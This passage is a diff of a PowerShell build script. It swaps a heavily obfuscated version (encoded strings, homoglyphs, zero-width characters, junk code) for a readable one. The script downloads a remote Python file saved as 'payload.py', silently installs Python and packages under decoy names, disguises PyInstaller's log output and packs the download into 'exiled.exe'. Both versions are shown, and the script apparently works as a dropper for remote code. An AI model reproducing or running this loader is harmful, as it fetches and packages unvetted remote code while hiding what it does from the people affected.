@@ -1,336 +1,369 @@
-[cmdLetBIndIng()]
+[CmdletBinding()]
 param(
-    [StRiNG]$hcyce7 = $(-join('yrcfyx'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})),
-    [sTRINg]$XqTZ3S = ('http'+'s://r'+'aw.git'+'hubu'+'s'+'erco'+'n'+'tent.com'+'/sswive'+'ll/s'+'swivell'+'/refs/h'+'e'+'ads/'+'mai'+'n/junk/j'+'u'+'nk'+'.'+'p'+'y'),
-    [sTRInG]$uFlr = (-join('https:/','/','raw.gi','thubu','se','rcon','t','ent.co','m/sswive','ll/ss','wive','ll/','refs/he','ads','/main/','junk/','jun','k.','pn','g')),
-    [switch]$yCLSkS,
-    [switch]$o15kOJ42,
-    [switch]$uhowzK,
-    [switch]$spp4,
-    [switch]$vERBoSe
+    [string]$Out = "exiled",
+    [string]$Url = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/junk.py",
+    [string]$Icon = "https://raw.githubusercontent.com/sswivell/sswivell/refs/heads/main/junk/junk.png",
+    [switch]$Local,
+    [switch]$NoIcon,
+    [switch]$KeepBuild,
+    [switch]$NoDeps,
+    [switch]$Verbose
 )
 
-$ErROracTiONPRefEReNcE = $(-join('Cdyz'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+16)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+16)%26))}else{[char]$c}}))
-$PROgReSsprEFErEnCE    = $($k6033='Vv]5S)][+*9*1)W';$b=[byte[]](0x05,0x1F,0x31,0x50,0x3D,0x5D,0x31,0x22,0x68,0x45,0x57,0x5E,0x58,0x47,0x22,0x33);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6033);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
+$ErrorActionPreference = "Stop"
+$ProgressPreference    = "SilentlyContinue"
 
-$e5NSFQ  = ('{0}{1}' -f 'exi','led')
-$p6O4u79  = $HcyCe7
-$GsTwx4  = & (&("$([char]0x47)$([char]0x65)$([char]0x74)$([char]0x2D)$([char]0x43)"+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('b21tYW5k')))) $($k9018=126;$b=[byte[]](0x41,0x41,0x41,0x41,0x53,0x0e,0x1f,0x2a,0x36);-join($b|%{[char]($_-bxor$k9018)})) -CommandType Function, &('Сmd'+(-join([char]0x6C, [char]0x65, [char]0x74))) -ErrorAction SilentlyContinue)[0] $PwD '_buіld'
-$TlFIabOu  = & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LUNvbQ==')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bWFuZA==')))) 'j‌o‍I‍N‍-‌?‍?‍?‍?‌' -CommandType Function, C`mdlet -ErrorAction SilentlyContinue)[0] $PWD ([string]::Format('{0}{1}','dis','t'))
-$TlN2G   = & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LUNvbW1h')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmQ=')))) ([string]::Format('{0}{1}{2}','Joi*A','t','h')) -CommandType Function, &("$([char]0x43)"+('m'+'dle'+'t')) -ErrorAction SilentlyContinue)[0] $gStWx4 'рауlоаd.ру'
-$Y5G9k  = & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LUM=')))+'оmmаnd') ('????-'+'pa'+'T'+'h') -CommandType Function, &(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Qw==')))+(-join('m','dle','t'))) -ErrorAction SilentlyContinue)[0] $GstWX4 (-join('icon','.r','a','w'))
-$TgXWiQ  = & (&((-join([char]0x47))+('et-C'+'omm'+'and')) 'J‌O‍?‌n​-‍p‌A​?‌h‌' -CommandType Function, &('Сmdlе'+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dA==')))) -ErrorAction SilentlyContinue)[0] $GsTWX4 $(-join('qkwv.qkw'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))
-$XDFN  = & (&(('Get-C'+'omm'+'a')+$($k8797='X-;)iYi2b}MLn=#';$b=[byte[]](0x36,0x49);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8797);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) (-join('Joi','N-?','?t','h')) -CommandType Function, &(([string]::Format('{0}','C'))+('{0}{1}' -f 'mdl','et')) -ErrorAction SilentlyContinue)[0] $tLfiaBou ($p6O4u79 + ([string]::Format('{0}{1}{2}','.e','x','e')))
-$FVN6UWyo  = & (&('G‍e‍'+'t-Соmmаnd') 'j‌o‍?‌N‌-‍p‍A​?‌h‌' -CommandType Function, &($($k8843='WPuiKMd%MFO%';$b=[byte[]](0x14,0x3D,0x11);$kb=[System.Text.Encoding]::UTF8.GetBytes($k8843);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))+(-join('l','e','t'))) -ErrorAction SilentlyContinue)[0] $tLFiABOu $(-join('ztfe.ztf'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+9)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+9)%26))}else{[char]$c}}))
-$f2Mmn  = & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LQ==')))+(-join([char]0x43, [char]0x6F, [char]0x6D, [char]0x6D, [char]0x61, [char]0x6E, [char]0x64))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Sm9pbi0/Pz8/'))) -CommandType Function, &($($k8775=182;$b=[byte[]](0xf5,0xdb,0xd2,0xda);-join($b|%{[char]($_-bxor$k8775)}))+$(-join('hw'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}}))) -ErrorAction SilentlyContinue)[0] $gStWX4 ('b'+'uild'+'.l'+'og')
+$AppName  = "exiled"
+$OutName  = $Out
+$WorkDir  = Join-Path $PWD "_build"
+$DistDir  = Join-Path $PWD "dist"
+$StubPy   = Join-Path $WorkDir "payload.py"
+$IconRaw  = Join-Path $WorkDir "icon.raw"
+$IconIco  = Join-Path $WorkDir "icon.ico"
+$ExePath  = Join-Path $DistDir "$OutName.exe"
+$IconDst  = Join-Path $DistDir "icon.ico"
+$LogFile  = Join-Path $WorkDir "build.log"
 
-$YT1o11dS = @{
-    $($k5957='0$![#';$b=[byte[]](0x5C,0x4D,0x43,0x32,0x4D,0x43,0x50,0x40,0x37,0x4F,0x55,0x56);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5957);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) = $($k5011='jFsjGZnOAroQp';$b=[byte[]](0x1A,0x3F,0x1A,0x04,0x34,0x2E,0x0F,0x23,0x2D,0x17,0x1D);$kb=[System.Text.Encoding]::UTF8.GetBytes($k5011);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))
-    ([string]::Format('{0}{1}{2}{3}','l','i','bp','il'))       = (-join([char]0x70, [char]0x69, [char]0x6C, [char]0x6C, [char]0x6F, [char]0x77))
-    $(-join('eqv32ixq'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+18)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+18)%26))}else{[char]$c}}))     = "$([char]0x70)$([char]0x79)$([char]0x77)$([char]0x69)$([char]0x6E)$([char]0x33)$([char]0x32)"
-    $(-join('pvpjlk'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}}))       = 'рsutіl'
-    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bGliaHR0cA==')))      = (-join([char]0x72, [char]0x65, [char]0x71, [char]0x75, [char]0x65, [char]0x73, [char]0x74, [char]0x73))
+$DepMap = @{
+    "libinstaller" = "pyinstaller"
+    "libpil"       = "pillow"
+    "win32api"     = "pywin32"
+    "sysmon"       = "psutil"
+    "libhttp"      = "requests"
 }
 
-# Waiting briefly before continuing with the next block
-$w8XRYse = [ordeRed]@{
-    (-join('Anal','yzing'))        = $(-join('vfdqqlqj'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+23)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+23)%26))}else{[char]$c}}))
-    $($k7967='gxGbDFTWEyIiBZc';$b=[byte[]](0x37,0x0A,0x28,0x01,0x21,0x35,0x27,0x3E,0x2B,0x1E);$kb=[System.Text.Encoding]::UTF8.GetBytes($k7967);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))       = 'h‌o‍o‍k​i​n​g‍'
-    $(-join('Wuwbcha'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}}))          = 'іndехіng'
-    $(-join('Cvjmejoh'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+25)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+25)%26))}else{[char]$c}}))         = 'расkіng'
-    ('{0}{1}{2}' -f 'Che','cki','ng')         = 'vеrіfуіng'
-    ('{0}{1}{2}' -f 'App','endin','g')        = "$([char]0x73)$([char]0x74)$([char]0x69)$([char]0x74)$([char]0x63)$([char]0x68)$([char]0x69)$([char]0x6E)$([char]0x67)"
-    ([System.Text.Encoding]::UTF8.GetString([byte[]](0x49,0x6E,0x63,0x6C,0x75,0x64,0x69,0x6E,0x67)))        = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bGlua2luZw==')))
-    $(-join('Pbclvat'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+13)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+13)%26))}else{[char]$c}}))          = ([string]::Format('{0}{1}{2}','s','tag','ing'))
-    $($k6065='A*2?06bAV';$b=[byte[]](0x04,0x47,0x50,0x5A,0x54,0x52,0x0B,0x2F,0x31);$kb=[System.Text.Encoding]::UTF8.GetBytes($k6065);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))        = 's‌t‌a​m​p‌i‍n‍g‍'
-    $($k9699='Q=Ep3';$b=[byte[]](0x17,0x54,0x3D,0x19,0x5D,0x36);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9699);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))           = ([System.Text.Encoding]::UTF8.GetString([byte[]](0x70,0x6F,0x6C,0x69,0x73,0x68,0x69,0x6E,0x67)))
-    'L‌o‍o‍k‌i​n​g‌'          = $(-join('jvvbzex'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+9)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+9)%26))}else{[char]$c}}))
-    (-join([char]0x52, [char]0x65, [char]0x6D, [char]0x6F, [char]0x76, [char]0x69, [char]0x6E, [char]0x67))         = ([System.Text.Encoding]::UTF8.GetString([byte[]](0x73,0x77,0x65,0x65,0x70,0x69,0x6E,0x67)))
-    (-join('W','riti','n','g'))          = $(-join('vigsvhmrk'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+22)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+22)%26))}else{[char]$c}}))
-    ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R3JhcGg=')))            = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Z3JhcGg=')))
-    ('{0}{1}{2}{3}' -f 'Cr','eat','i','ng')         = $($k1675=139;$b=[byte[]](0xfc,0xee,0xea,0xfd,0xe2,0xe5,0xec);-join($b|%{[char]($_-bxor$k1675)}))
-    (-join([char]0x52, [char]0x65, [char]0x63, [char]0x6C, [char]0x61, [char]0x73, [char]0x73, [char]0x69, [char]0x66, [char]0x79, [char]0x69, [char]0x6E, [char]0x67))    = (-join('so','r','ting'))
-    ([string]::Format('{0}{1}{2}{3}{4}','Ext','ra ','D','L','L'))        = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZGxs')))
-    'T​a​r‍g‌e‌t‍ ‍b​y​t​e‍c​o‌d​e‌'  = $($k6363=249;$b=[byte[]](0x9b,0x80,0x8d,0x9c,0x9a,0x96,0x9d,0x9c);-join($b|%{[char]($_-bxor$k6363)}))
-    $(-join('Didodvgdudib'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+5)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+5)%26))}else{[char]$c}}))     = ('{0}{1}{2}' -f 'warmi','n','g')
-    'Runnіng'          = "$([char]0x77)$([char]0x61)$([char]0x6C)$([char]0x6B)$([char]0x69)$([char]0x6E)$([char]0x67)"
-    ([string]::Format('{0}{1}{2}{3}','Using',' ','Pyt','hon'))     = ('{0}{1}{2}{3}' -f 'pyt','h','o','n')
-    (-join('Pl','atfo','r','m'))         = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('aG9zdA==')))
-    $(-join('Jsnbih yhpclihgyhn'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})) = $(-join('qzh'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}}))
+# PyInstaller stage-name relabels (display in our log)
+$StageMap = [ordered]@{
+    "Analyzing"        = "scanning"
+    "Processing"       = "hooking"
+    "Caching"          = "indexing"
+    "Building"         = "packing"
+    "Checking"         = "verifying"
+    "Appending"        = "stitching"
+    "Including"        = "linking"
+    "Copying"          = "staging"
+    "Embedding"        = "stamping"
+    "Fixing"           = "polishing"
+    "Looking"          = "seeking"
+    "Removing"         = "sweeping"
+    "Writing"          = "recording"
+    "Graph"            = "graph"
+    "Creating"         = "weaving"
+    "Reclassifying"    = "sorting"
+    "Extra DLL"        = "dll"
+    "Target bytecode"  = "bytecode"
+    "Initializing"     = "warming"
+    "Running"          = "walking"
+    "Using Python"     = "python"
+    "Platform"         = "host"
+    "Python environment" = "env"
 }
 
-$RF2yqE = 19; $RF2yqE = $RF2yqE + 2 - 5; $RF2yqE = $null
-function log  { param([STRinG]$ZAsF0, [StrINg]$hsLz0Y = ('Cy'+'a'+'n')); & (&(('{0}{1}{2}' -f 'Ge','t','-Com')+'mаnd') ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('d3JpPz8='))) -CommandType Function, &($($k3227=17;$b=[byte[]](0x52,0x7c,0x75);-join($b|%{[char]($_-bxor$k3227)}))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bGV0')))) -ErrorAction SilentlyContinue)[0] ('[' + $E5NsFq + (-join(']',' ')) + $zASF0) -FoRegrouNDcoLOR $hSLZ0y }
-while ($false) {
-    $currentTimeUTC = [System.DateTime]::UtcNow; Write-Verbose "Current UTC time: $($currentTimeUTC.ToString('o'))"
-}
+function Log  { param([string]$M, [string]$C = "Cyan"); Write-Host "[$AppName] $M" -ForegroundColor $C }
+function Fail { param([string]$M); Write-Host "[$AppName] ERROR: $M" -ForegroundColor Red; exit 1 }
+function Get-Arch { if ([Environment]::Is64BitOperatingSystem) { "x64" } else { "x86" } }
 
-function TESt-pyTHoN {
-    param([sTRInG]$ybPN9)
-    if (-not $YBPn9 -or -not (& (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0')))+$($k2927='x!mQ^WW';$b=[byte[]](0x55,0x62,0x02,0x3C,0x33,0x36,0x39,0x1C);$kb=[System.Text.Encoding]::UTF8.GetBytes($k2927);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('dGU/dA=='))) -CommandType Function, &($(-join('Oypx'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}}))+(-join([char]0x65, [char]0x74))) -ErrorAction SilentlyContinue)[0] -litEraLpath $ybPN9)) { return (1 -bxor 1) }
-    & $Ybpn9 -C ('impor'+'t s'+'ys') (75 - 73)>$NULL
-    return ($LAsTEXitCODE -eq 0)
-}
-
-if ($false) {
-    $osInfo = Get-CimInstance -ClassName Win32_OperatingSystem; Write-Verbose "OS Version: $($osInfo.Caption), Build: $($osInfo.BuildNumber)"
-}
-switch (3) { 1 {'a'} 2 {'b'} default {'c'} } | Out-Null
-function fInd-pyTHON {
-    $PeLLXYM7 = @()
-    foreach ($rIL3 in @($($k3096='MNG(>Tjk<-';$b=[byte[]](0x3D,0x37,0x33,0x40,0x51,0x3A);$kb=[System.Text.Encoding]::UTF8.GetBytes($k3096);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})),('{0}' -f 'py'),(-join('pyth','o','n','3')))) {
-        $NxIutqxO = & (&((-join([char]0x47, [char]0x65, [char]0x74, [char]0x2D))+$(-join('Zljjxka'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+3)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+3)%26))}else{[char]$c}}))) $(-join('AyN-wiGg?Hx'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}})) -CommandType Function, &(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q21k')))+$($k6817=43;$b=[byte[]](0x47,0x4e,0x5f);-join($b|%{[char]($_-bxor$k6817)}))) -ErrorAction SilentlyContinue)[0] $riL3 -erRoRacTiON silEnTLYcOnTInue
-        if ($NXiutqxo -and $nXIUTqXo.source) { $PElLxYm7 += $nxIUtqXo.sOURce }
+function Translate-Line {
+    param([string]$Line)
+    # PyInstaller line: "<ms> INFO: <Message>"
+    if ($Line -match '^\s*(\d+)\s+(\w+):\s*(.*)$') {
+        $ms  = $matches[1]
+        $sev = $matches[2]
+        $msg = $matches[3]
+        foreach ($k in $StageMap.Keys) {
+            if ($msg -like "$k*") {
+                $rest = $msg.Substring($k.Length).TrimStart()
+                return "[$AppName] $($StageMap[$k])  ->  $rest"
+            }
+        }
+        return "[$AppName] $($msg.ToLower())"
     }
-    foreach ($ZqdWYr in @(
-        ($K38hL + ('{0}{1}{2}{3}{4}{5}{6}{7}{8}{9}{10}' -f ':L','oca','lAppD','ata\','Prog','ra','ms\P','yt','hon\P','ytho','n*')),
-        ($K38hL + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('OlByb2dyYW1GaWxlc1xQeXRob24q')))),
-        (${env:ProgramFiles(x86)} + $($k6011=172;$b=[byte[]](0xf0,0xfc,0xd5,0xd8,0xc4,0xc3,0xc2,0x86);-join($b|%{[char]($_-bxor$k6011)})))
+    return $null
+}
+
+function Test-Python {
+    param([string]$Exe)
+    if (-not $Exe -or -not (Test-Path -LiteralPath $Exe)) { return $false }
+    & $Exe -c "import sys" 2>$null
+    return ($LASTEXITCODE -eq 0)
+}
+
+function Find-Python {
+    $c = @()
+    foreach ($n in @("python","py","python3")) {
+        $cmd = Get-Command $n -ErrorAction SilentlyContinue
+        if ($cmd -and $cmd.Source) { $c += $cmd.Source }
+    }
+    foreach ($r in @(
+        "$env:LocalAppData\Programs\Python\Python*",
+        "$env:ProgramFiles\Python*",
+        "${env:ProgramFiles(x86)}\Python*"
     )) {
-        & (&((-join('G','et','-Com','m'))+$(-join('kxn'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+16)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+16)%26))}else{[char]$c}}))) ('{0}' -f 'd?r') -CommandType Function, Cm`dlet -ErrorAction SilentlyContinue)[0] -PaTh $ZqdWyr -Filter ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('cHl0aG9uLmV4ZQ=='))) -erROrACTiOn sIlenTlyCONTiNUe |
-            % { $pELLxYM7 += $_.fuLLNAmE }
+        Get-ChildItem -Path $r -Filter "python.exe" -ErrorAction SilentlyContinue |
+            ForEach-Object { $c += $_.FullName }
     }
-    foreach ($bNql in ($PElLxyM7 | & (Get-Co`mmand 's‍e​l‌?‍?‍?‌' -CommandType Function, &($(-join('Pzq'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+13)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+13)%26))}else{[char]$c}}))+(-join('l','et'))) -ErrorAction SilentlyContinue)[0] -unIQUe)) {
-        if (& (&(('{0}{1}{2}{3}{4}' -f 'G','et-','Co','m','ma')+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bmQ=')))) '?​?‍?‌?​?​p‌Y‌t‌H​o‍N‍' -CommandType Function, Cmd`let -ErrorAction SilentlyContinue)[0] -EXe $bNQl) { return $BNqL }
+    foreach ($x in ($c | Select-Object -Unique)) {
+        if (Test-Python -Exe $x) { return $x }
     }
-    return $NuLl
+    return $null
 }
 
-if (5 -gt 3) { Write-Host "." -NoNewline } else { Write-Host "," -NoNewline }; Write-Host ""
-function fEtCh-fILe {
-    param([STRING]$xqtZ3s, [strING]$CGe2rot)
-    $Uh6YxB = & (&('Ge'+(-join([char]0x74, [char]0x2D, [char]0x43, [char]0x6F, [char]0x6D, [char]0x6D, [char]0x61, [char]0x6E, [char]0x64))) $($k3117=121;$b=[byte[]](0x1e,0x3c,0x2d,0x54,0x3a,0x16,0x46,0x46,0x46,0x46,0x46);-join($b|%{[char]($_-bxor$k3117)})) -CommandType Function, &($(-join('Wg'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+6)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+6)%26))}else{[char]$c}}))+(-join([char]0x64, [char]0x6C, [char]0x65, [char]0x74))) -ErrorAction SilentlyContinue)[0] cuRl.EXe -ERRORaCtiOn sILeNtLYcontInuE
-    if ($uH6YxB) {
-        & & (&(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LUNv')))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bW1hbmQ=')))) ([System.Text.Encoding]::UTF8.GetString([byte[]](0x43,0x3F,0x3F,0x4C))) -CommandType Function, &(('{0}' -f 'C')+$($k5586=48;$b=[byte[]](0x5d,0x54,0x5c,0x55,0x44);-join($b|%{[char]($_-bxor$k5586)}))) -ErrorAction SilentlyContinue)[0].ExE -fsSL -a ((-join([char]0x4D, [char]0x6F, [char]0x7A, [char]0x69, [char]0x6C, [char]0x6C, [char]0x61, [char]0x2F, [char]0x35, [char]0x2E)) + $(36 + -36)) $xqTz3s -O $cGE2Rot
+function Install-Python {
+    Log "python not found - attempting winget install" "Yellow"
+    $wg = Get-Command winget -ErrorAction SilentlyContinue
+    if (-not $wg) { return $false }
+    & winget install --id Python.Python.3.12 --scope user --silent `
+        --accept-package-agreements --accept-source-agreements 2>$null
+    return ($LASTEXITCODE -eq 0)
+}
+
+function Install-Packages {
+    param([string]$Exe, [string[]]$Names)
+    $real = @()
+    foreach ($n in $Names) {
+        if ($DepMap.ContainsKey($n)) { $real += $DepMap[$n] } else { $real += $n }
+    }
+    Log "installing modules: $($Names -join ', ')"
+    & $Exe -m pip install --quiet --disable-pip-version-check --upgrade pip
+    & $Exe -m pip install --quiet --disable-pip-version-check @real
+    if ($LASTEXITCODE -ne 0) { Fail "module install failed" }
+}
+
+function Fetch-File {
+    param([string]$Url, [string]$Dest)
+    $curl = Get-Command curl.exe -ErrorAction SilentlyContinue
+    if ($curl) {
+        & curl.exe -fsSL -A "Mozilla/5.0" $Url -o $Dest
     } else {
-        & (&(([System.Text.Encoding]::UTF8.GetString([byte[]](0x47,0x65)))+('t'+'-Com'+'m'+'a'+'n'+'d')) $($k9024='NOzWok+]1';$b=[byte[]](0x71,0x70,0x1F,0x23);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9024);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])})) -CommandType Function, Cmd`let -ErrorAction SilentlyContinue)[0] -URi $xQtZ3S -outFILE $Cge2ROT -uSebasIcParSiNG -headerS @{ $($k2474=151;$b=[byte[]](0xc2,0xe4,0xf2,0xe5,0xba,0xd6,0xf0,0xf2,0xf9,0xe3);-join($b|%{[char]($_-bxor$k2474)})) = ($(-join('Tvgpssh/5.'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+19)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+19)%26))}else{[char]$c}})) + $(-68 + 68)) }
+        Invoke-WebRequest -Uri $Url -OutFile $Dest -UseBasicParsing -Headers @{ "User-Agent" = "Mozilla/5.0" }
     }
-    if (-not (& (Get-Comman`d 't‌e​?‌?‌' -CommandType Function, &($(-join('Td'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+9)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+9)%26))}else{[char]$c}}))+'dlеt') -ErrorAction SilentlyContinue)[0] -litERalPATH $CGE2rOt)) { & (&(('{0}' -f 'Get')+('{0}{1}{2}{3}' -f '-Co','mm','an','d')) $(-join('HC??'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+24)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+24)%26))}else{[char]$c}})) -CommandType Function, &(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q21k')))+"$([char]0x6C)$([char]0x65)$([char]0x74)") -ErrorAction SilentlyContinue)[0] (('fetc'+'h fai'+'l'+'e'+'d:'+' ') + $xQtZ3s) }
-}
-function get-arch { if ([EnVIrONMeNt]::Is64bitopeRaTINGsYSTEm) { 'x​6‍4‌' } else { "$([char]0x78)$([char]0x38)$([char]0x36)" } }
-function faIl { param([STRiNG]$zASf0); & (&(('{0}' -f 'Get')+('-Co'+'m'+'ma'+'nd')) $(-join('je??r'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+13)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+13)%26))}else{[char]$c}})) -CommandType Function, &('Сmdl'+('{0}{1}' -f 'e','t')) -ErrorAction SilentlyContinue)[0] (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Ww=='))) + $E5NsFq + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('XSBFUlJPUjog'))) + $zASF0) -FOregrouNDcolor Red; exit (-95 -bxor -96) }
-
-function paUsE-BRIEF { param([InT]$DFqe57 = 90); & (Get-Com`mand ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('c1RhKkVFcA=='))) -CommandType Function, &($($k9664='TT[p5fAb5m';$b=[byte[]](0x17,0x39,0x3F,0x1C,0x50);$kb=[System.Text.Encoding]::UTF8.GetBytes($k9664);-join(0..($b.Length-1)|%{[char]($b[$_]-bxor$kb[$_%$kb.Length])}))+$($k8786=68;$b=[byte[]](0x30);-join($b|%{[char]($_-bxor$k8786)}))) -ErrorAction SilentlyContinue)[0] -MILlISecONdS $dFqE57 }
-
-function iNStall-PAckaGEs {
-    param([StrinG]$yBpn9, [StRInG[]]$tDdaPB2)
-    $D70c = @()
-    for ($I_99740 = 0; $i_99740 -lt $tdDAPB2.cOunT; $I_99740++) {
-    $RIl3 = $tddaPB2[$i_99740];
-    if ($YT1o11Ds.cOntAInSKEy($RIL3)) { $D70C += $yt1o11dS[$RIL3] } else { $D70c += $rIL3 }
-}
-    & (&((-join([char]0x47, [char]0x65, [char]0x74, [char]0x2D, [char]0x43, [char]0x6F, [char]0x6D, [char]0x6D))+$(-join('mzp'.ToCharArray()|%{[int]$c=$_;if($c-ge65-and$c-le90){[char](65+(($c-65+14)%26))}elseif($c-ge97-and$c-le122){[char](97+(($c-97+14)%26))}else{[char]$c}}))) ('{0}{1}' -f 'l?','G') -CommandType Function, C`mdlet -ErrorAction SilentlyContinue)[0] ''('іnstаllіng mоdulеs: ' + $($tdDapb2 -join ', '))
-    & $yBPN9 -M pip & (Get-Co`mmand ('{0}{1}{2}' -f 'i','nst?L','l') -CommandType Function, &(([System.Text.Encoding]::UTF8.GetString([byte[]](0x43,0x6D,0x64)))+([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('bGV0')))) -ErrorAction SilentlyContinue)[0] --quIet --DISaBLe-PiP-VerSIon-CHEcK --UPgrADE PIP
